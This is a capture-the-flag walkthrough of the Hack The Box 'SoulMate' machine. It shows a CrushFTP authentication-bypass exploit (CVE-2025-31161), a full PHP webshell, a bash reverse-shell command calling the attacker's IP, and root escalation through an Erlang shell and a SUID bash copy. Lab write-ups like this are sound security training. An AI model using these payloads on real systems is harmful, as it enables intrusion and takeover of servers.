---
icon: hearts
cover: ../../../../.gitbook/assets/Screenshot 2026-02-14 221036.png
coverY: 10.368950345694532
---

# HTB-SOULMATE(S9)

<figure><img src="../../../../.gitbook/assets/image (582).png" alt=""><figcaption></figcaption></figure>

### Reconnaissance

#### Initial Port Scanning

Let's start with a comprehensive nmap scan to identify open ports and services:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ sudo nmap 10.10.11.86 - blah blah 
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.86
Host is up (0.025s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

Now let's perform a detailed service scan on the discovered ports:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ sudo nmap -p 22,80 -sCV 10.10.11.86
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.86
Host is up (0.025s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://soulmate.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**Findings:**

* SSH (OpenSSH 8.9p1) on port 22
* HTTP (nginx 1.18.0) on port 80 with redirect to `soulmate.htb`
* Target is running Ubuntu 22.04 (based on service versions)
* TTL of 63 indicates Linux system one hop away

#### DNS Configuration

The HTTP service redirects to `soulmate.htb`, so we need to add this to our hosts file:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ echo "10.10.11.86 soulmate.htb" | sudo tee -a /etc/hosts
10.10.11.86 soulmate.htb
```

#### Subdomain Enumeration

Since the application uses virtual host routing, let's search for additional subdomains:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ ffuf -u http://10.10.11.86 -H "Host: FUZZ.soulmate.htb" -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.86
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 :: Header           : Host: FUZZ.soulmate.htb
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
________________________________________________

ftp                     [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 59ms]
:: Progress: [19966/19966] :: Job [1/1] :: 1851 req/sec :: Duration: [0:00:14] :: Errors: 0 ::
```

**Discovery:** Found subdomain `ftp.soulmate.htb`

Let's add this to our hosts file as well:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ echo "10.10.11.86 ftp.soulmate.htb" | sudo tee -a /etc/hosts
10.10.11.86 ftp.soulmate.htb
```

***

### Web Application Analysis

#### Main Site - soulmate.htb

<figure><img src="../../../../.gitbook/assets/image (577).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl -I http://soulmate.htb
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Feb 2026 10:30:00 GMT
Content-Type: text/html; charset=UTF-8
Connection: keep-alive
Set-Cookie: PHPSESSID=p82v21e5ul1veblbivusc1j2h4; path=/
```

Visiting `http://soulmate.htb` in the browser reveals:

* A dating/matchmaking website
* Registration and login functionality
* Profile creation with image upload capability
* PHP-based application (evident from .php extensions and PHPSESSID cookie)

**Directory Enumeration**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ feroxbuster -u http://soulmate.htb -x php -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://soulmate.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/raft-medium-directories.txt
 💲  Extensions            │ [php]
 🏁  HTTP methods          │ [GET]
───────────────────────────┴──────────────────────

200      GET      178l      488w     8554c http://soulmate.htb/login.php
200      GET      238l      611w    11107c http://soulmate.htb/register.php
200      GET      306l     1061w    16688c http://soulmate.htb/index.php
302      GET        0l        0w        0c http://soulmate.htb/logout.php => login.php
302      GET        0l        0w        0c http://soulmate.htb/profile.php => http://soulmate.htb/login
302      GET        0l        0w        0c http://soulmate.htb/dashboard.php => http://soulmate.htb/login
301      GET        7l       12w      178c http://soulmate.htb/assets => http://soulmate.htb/assets/
```

**Analysis:** The main site appears to be a basic dating application with limited attack surface. File upload functionality exists but is restricted to images.

#### FTP Subdomain - ftp.soulmate.htb

<figure><img src="../../../../.gitbook/assets/image (578).png" alt=""><figcaption></figcaption></figure>

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl -I http://ftp.soulmate.htb
HTTP/1.1 302 Redirect
Server: nginx/1.18.0 (Ubuntu)
Date: Sat, 14 Feb 2026 10:35:00 GMT
Connection: keep-alive
Set-Cookie: currentAuth=M66R; path=/
Set-Cookie: CrushAuth=1770936283737_nao4gVOjjFelUqKpsIRCVm8eUxM66R; path=/; HttpOnly
location: /WebInterface/login.html
```

Navigating to `http://ftp.soulmate.htb` reveals a **CrushFTP** login page.

**Version Identification**

Let's examine the page source to identify the CrushFTP version:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl -s http://ftp.soulmate.htb/WebInterface/login.html | grep -i "version\|\.js?v="
<script type="module" crossorigin src="/WebInterface/new-ui/assets/app/components/loader2.js?v=11.W.657-2025_03_08_07_52"></script>
```

**Identified Version:** CrushFTP 11.W.657 (built on March 8, 2025)

***

### Exploitation

#### CVE Research

Let's search for known vulnerabilities affecting this CrushFTP version:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ searchsploit crushftp
-------------------------------------------------------------------------------
 Exploit Title                                            |  Path
-------------------------------------------------------------------------------
CrushFTP 10 < 10.8.5 / 11 < 11.3.4 - Authentication Bypa | java/webapps/52287.py
CrushFTP < 10.7.4 - Authentication Bypass (CVE-2025-3116 | multiple/webapps/52063.py
-------------------------------------------------------------------------------
```

**Key Vulnerabilities Found:**

* **CVE-2025-31161** - Authentication bypass to Admin access (April 2025)
* **CVE-2025-54309** - Authentication bypass to Admin access (November 2025)

<figure><img src="../../../../.gitbook/assets/image (579).png" alt=""><figcaption></figcaption></figure>

#### Exploiting CVE-2025-31161

This vulnerability allows creating an admin user by exploiting AWS S3 authentication flow weaknesses.

**Downloading the Exploit**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ git clone https://github.com/0xgh057r3c0n/CVE-2025-31161.git
Cloning into 'CVE-2025-31161'...
remote: Enumerating objects: 32, done.
remote: Total 32 (delta 15), reused 0 (delta 0)
Receiving objects: 100% (32/32), 15.58 KiB | 1.56 MiB/s, done.
Resolving deltas: 100% (15/15), done.

┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ cd CVE-2025-31161
```

**Installing Dependencies**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate/CVE-2025-31161]
└─$ pip3 install requests colorama
Collecting requests
  Using cached requests-2.31.0-py3-none-any.whl
Installing collected packages: requests, colorama
Successfully installed colorama-0.4.6 requests-2.31.0
```

**Running the Exploit**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate/CVE-2025-31161]
└─$ python3 CVE-2025-31161.py --target_host ftp.soulmate.htb --port 80 --new_user sn0x --password sn0x123

[+] Preparing Payloads
  [-] Warming up the target...
  [-] Target is up and running
[+] Sending Account Create Request
  [!] User created successfully!

[+] Exploit Complete! You can now login with:
   [*] Username: sn0x
   [*] Password: sn0x123
```

**Success!** We've created an admin account with credentials `sn0x:sn0x123`

#### Accessing CrushFTP Admin Panel

Navigate to `http://ftp.soulmate.htb/WebInterface/login.html` and login with our newly created credentials.

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl -X POST http://ftp.soulmate.htb/WebInterface/login.html \
  -d "username=sn0x&password=sn0x123" \
  -c cookies.txt
```

Once logged in, we have full administrative access to CrushFTP.

***

### Initial Access

#### User Management

Navigate to **Admin → User Manager** in the CrushFTP interface. Here we can see all registered users including user `ben` who has access to the `/webProd` directory containing PHP files.

**Resetting User Password**

We'll reset ben's password to gain access to his account:

1. Click on user `ben` in User Manager
2. Change password to `sn0x123`
3. Save changes

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ # Now we can login as ben with password: sn0x123
```

#### PHP Webshell Upload

Login as ben and navigate to the Files section. We can see ben has access to `/webProd` which likely hosts the main website.

**Creating the Webshell**

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ cat > webshell.php << 'EOF'
<?php
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>
EOF
```

**Uploading the Webshell**

1. Navigate to Files → /webProd in CrushFTP
2. Click "Add files" and upload `webshell.php`
3. The file is now accessible from the main domain

#### Testing Command Execution

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl "http://soulmate.htb/webshell.php?cmd=id"
<pre>uid=33(www-data) gid=33(www-data) groups=33(www-data)
</pre>

┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl "http://soulmate.htb/webshell.php?cmd=whoami"
<pre>www-data
</pre>

┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl "http://soulmate.htb/webshell.php?cmd=pwd"
<pre>/var/www/soulmate.htb/public
</pre>
```

<figure><img src="../../../../.gitbook/assets/image (581).png" alt=""><figcaption></figcaption></figure>

**Success!** We have remote code execution as the `www-data` user.

#### Establishing Reverse Shell

Set up a listener on our attack machine:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ nc -lnvp 4444
Listening on 0.0.0.0 4444
```

Trigger the reverse shell:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ curl -G "http://soulmate.htb/webshell.php" \
  --data-urlencode "cmd=bash -c 'bash -i >& /dev/tcp/10.10.15.76/4444 0>&1'"
```

Back on our listener:

```bash
Connection received on 10.10.11.86 34824
bash: cannot set terminal process group (1151): Inappropriate ioctl for device
bash: no job control in this shell
www-data@soulmate:/var/www/soulmate.htb/public$ 
```

#### Shell Upgrade

```bash
www-data@soulmate:/var/www/soulmate.htb/public$ python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@soulmate:/var/www/soulmate.htb/public$ ^Z
[1]+  Stopped                 nc -lnvp 4444

┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ stty raw -echo; fg
nc -lnvp 4444
             reset
reset: unknown terminal type unknown
Terminal type? screen

www-data@soulmate:/var/www/soulmate.htb/public$ export TERM=xterm
www-data@soulmate:/var/www/soulmate.htb/public$ stty rows 38 columns 116
```

***

### Privilege Escalation to User Ben

#### System Enumeration

```bash
www-data@soulmate:/var/www/soulmate.htb/public$ ls -la /home
total 12
drwxr-xr-x  3 root root 4096 Sep  2 10:27 .
drwxr-xr-x 18 root root 4096 Aug  6  2025 ..
drwxr-x---  3 ben  ben  4096 Sep  2 10:27 ben

www-data@soulmate:/var/www/soulmate.htb/public$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
ben:x:1000:1000:,,,:/home/ben:/bin/bash
```

Only one user with a home directory: `ben`

#### Process Analysis

```bash
www-data@soulmate:/$ ps auxww | grep -i erlang
root        1144  0.0  1.6 2252184 67372 ?       Ssl  Feb12   0:29 /usr/local/lib/erlang_login/start.escript -B -- -root /usr/local/lib/erlang -bindir /usr/local/lib/erlang/erts-15.2.5/bin -progname erl -- -home /root -- -noshell -boot no_dot_erlang -sname ssh_runner -run escript start -- -- -kernel inet_dist_use_interface {127,0,0,1} -- -extra /usr/local/lib/erlang_login/start.escript
```

**Critical Finding:** An Erlang SSH service is running as root on the system.

#### Investigating Erlang Service

```bash
www-data@soulmate:/$ ls -la /usr/local/lib/erlang_login/
total 16
drwxr-xr-x 2 root root 4096 Aug 15 07:46 .
drwxr-xr-x 4 root root 4096 Aug  6  2025 ..
-rw-r--r-- 1 root root  858 Aug 15 07:46 login.escript
-rwxr-xr-x 1 root root 1427 Aug 15 07:46 start.escript

www-data@soulmate:/$ cat /usr/local/lib/erlang_login/start.escript
#!/usr/bin/env escript
%%! -sname ssh_runner

main(_) ->
    application:start(asn1),
    application:start(crypto),
    application:start(public_key),
    application:start(ssh),

    io:format("Starting SSH daemon with logging...~n"),

    case ssh:daemon(2222, [
        {ip, {127,0,0,1}},
        {system_dir, "/etc/ssh"},

        {user_dir_fun, fun(User) ->
            Dir = filename:join("/home", User),
            io:format("Resolving user_dir for ~p: ~s/.ssh~n", [User, Dir]),
            filename:join(Dir, ".ssh")
        end},

        {connectfun, fun(User, PeerAddr, Method) ->
            io:format("Auth success for user: ~p from ~p via ~p~n",
                      [User, PeerAddr, Method]),
            true
        end},

        {failfun, fun(User, PeerAddr, Reason) ->
            io:format("Auth failed for user: ~p from ~p, reason: ~p~n",
                      [User, PeerAddr, Reason]),
            true
        end},

        {auth_methods, "publickey,password"},

        {user_passwords, [{"ben", "HouseH0ldings998"}]},
        {idle_time, infinity},
        {max_channels, 10},
        {max_sessions, 10},
        {parallel_login, true}
    ]) of
        {ok, _Pid} ->
            io:format("SSH daemon running on port 2222. Press Ctrl+C to exit.~n");
        {error, Reason} ->
            io:format("Failed to start SSH daemon: ~p~n", [Reason])
    end,

    receive
        stop -> ok
    end.
```

**Credential Discovery:** Hardcoded password for user `ben` found in the Erlang script:

* Username: `ben`
* Password: `HouseH0ldings998`

#### Switching to User Ben

```bash
www-data@soulmate:/$ su - ben
Password: HouseH0ldings998
ben@soulmate:~$ id
uid=1000(ben) gid=1000(ben) groups=1000(ben)
```

Alternatively, SSH directly as ben:

```bash
┌──(sn0x㉿sn0x)-[~/HTB/SoulMate]
└─$ sshpass -p 'HouseH0ldings998' ssh ben@10.10.11.86
ben@soulmate:~$ 
```

#### User Flag

```bash
ben@soulmate:~$ ls -la
total 28
drwxr-x--- 3 ben  ben  4096 Sep  2 10:27 .
drwxr-xr-x 3 root root 4096 Sep  2 10:27 ..
lrwxrwxrwx 1 root root    9 Aug 27 09:28 .bash_history -> /dev/null
-rw-r--r-- 1 ben  ben   220 Aug  6  2025 .bash_logout
-rw-r--r-- 1 ben  ben  3771 Aug  6  2025 .bashrc
drwx------ 2 ben  ben  4096 Sep  2 10:27 .cache
-rw-r--r-- 1 ben  ben   807 Aug  6  2025 .profile
-rw-r----- 1 root ben    33 Feb 14 12:52 user.txt
```

***

### Privilege Escalation to Root

#### Sudo Enumeration

```bash
ben@soulmate:~$ sudo -l
[sudo] password for ben: 
Sorry, user ben may not run sudo on soulmate.
```

No sudo privileges for ben.

#### Connecting to Erlang SSH Service

Remember the Erlang SSH daemon running on port 2222? Let's connect to it:

```bash
ben@soulmate:~$ netstat -tlnp
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 127.0.0.1:2222          0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -

ben@soulmate:~$ ssh -p 2222 ben@localhost
The authenticity of host '[localhost]:2222 ([127.0.0.1]:2222)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[localhost]:2222' (ED25519) to the list of known hosts.
ben@localhost's password: HouseH0ldings998

Eshell V15.2.5 (press Ctrl+G to abort, type help(). for help)
(ssh_runner@soulmate)1> 
```

**Success!** We're now in an Erlang shell (Eshell).

#### Erlang Shell Exploration

```erlang
(ssh_runner@soulmate)1> help().
** shell internal commands **
b()        -- display all variable bindings
e(N)       -- repeat the expression in query <N>
f()        -- forget all variable bindings
...
pwd()      -- print working directory
ls()       -- list files in the current directory
m()        -- which modules are loaded
...
```

Let's explore the available modules:

```erlang
(ssh_runner@soulmate)2> m().
...
file       /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/file.beam
os         /usr/local/lib/erlang/lib/kernel-10.2.5/ebin/os.beam
...
```

The `os` module is loaded and can execute system commands!

#### Checking Current Privileges

```erlang
(ssh_runner@soulmate)3> os:cmd("id").
"uid=0(root) gid=0(root) groups=0(root)\n"

(ssh_runner@soulmate)4> os:cmd("whoami").
"root\n"
```

**Critical Discovery:** The Erlang shell is running with root privileges!

#### Reading Root Flag

```erlang
(ssh_runner@soulmate)5> ls("/root").
.bash_history        .bashrc              .cache               
.config              .erlang.cookie       .local               
.profile             .selected_editor     .sqlite_history      
.ssh                 .wget-hsts           root.txt

(ssh_runner@soulmate)6> {ok, Data} = file:read_file("/root/root.txt").
{ok,<<"8011bd8a************************\n">>}
```

#### Alternative: Getting a Root Shell

If we want an actual root shell instead of just reading the flag:

```erlang
(ssh_runner@soulmate)7> os:cmd("cp /bin/bash /tmp/sn0x_bash").
[]

(ssh_runner@soulmate)8> os:cmd("chmod 6777 /tmp/sn0x_bash").
[]

(ssh_runner@soulmate)9> os:cmd("ls -la /tmp/sn0x_bash").
"-rwsrwsrwx 1 root root 1396520 Feb 14 15:30 /tmp/sn0x_bash\n"
```

Now from the regular SSH session as ben:

```bash
ben@soulmate:~$ /tmp/sn0x_bash -p
sn0x_bash-5.1# id
uid=1000(ben) gid=1000(ben) euid=0(root) egid=0(root) groups=0(root),1000(ben)

sn0x_bash-5.1# cat /root/root.txt
8011bd8a************************
```

***

***
